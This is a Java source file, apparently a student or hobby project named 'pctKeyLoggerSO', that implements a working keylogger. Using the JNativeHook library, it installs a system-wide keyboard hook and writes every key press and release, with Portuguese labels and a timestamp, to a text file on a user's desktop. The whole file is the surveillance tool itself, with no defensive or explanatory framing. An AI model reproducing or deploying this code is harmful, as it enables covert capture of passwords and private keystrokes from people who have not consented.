package pctKeyLoggerSO;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

	ArrayList<String> vetTeclas = new ArrayList<String>();
	
	DateTimeFormatter dtf = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm:ss");
	LocalDateTime now = LocalDateTime.now();

	public static void main(String[] args) {

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}

		GlobalScreen.getInstance().addNativeKeyListener(new Main());

	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent tecla) {
		vetTeclas.add("Pressionado: " + NativeKeyEvent.getKeyText(tecla.getKeyCode()));

		//SalvarArquivoAoPressionar-----------------------
		FileWriter arq = null;

		try {
			arq = new FileWriter("C:\\Users\\Roger Goyer\\Desktop\\arquivoKL.txt");
		} catch (IOException e) {
			e.printStackTrace();
		}
		PrintWriter gravarArq = new PrintWriter(arq);

		gravarArq.print(vetTeclas + " "  + dtf.format(now));

		try {
			arq.close();
		} catch (IOException e) {
			e.printStackTrace();
		}

		// -------------------
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent tecla) {
		vetTeclas.add("Solto: " + NativeKeyEvent.getKeyText(tecla.getKeyCode()));

		//SalvarArquivoAoSoltar-----------------------
		FileWriter arq = null;

		try {
			arq = new FileWriter("C:\\Users\\Roger Goyer\\Desktop\\arquivoKL.txt");
		} catch (IOException e) {
			e.printStackTrace();
		}
		PrintWriter gravarArq = new PrintWriter(arq);

		gravarArq.print(vetTeclas + " " + dtf.format(now));

		try {
			arq.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		// -------------------

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e1) {

	}

}
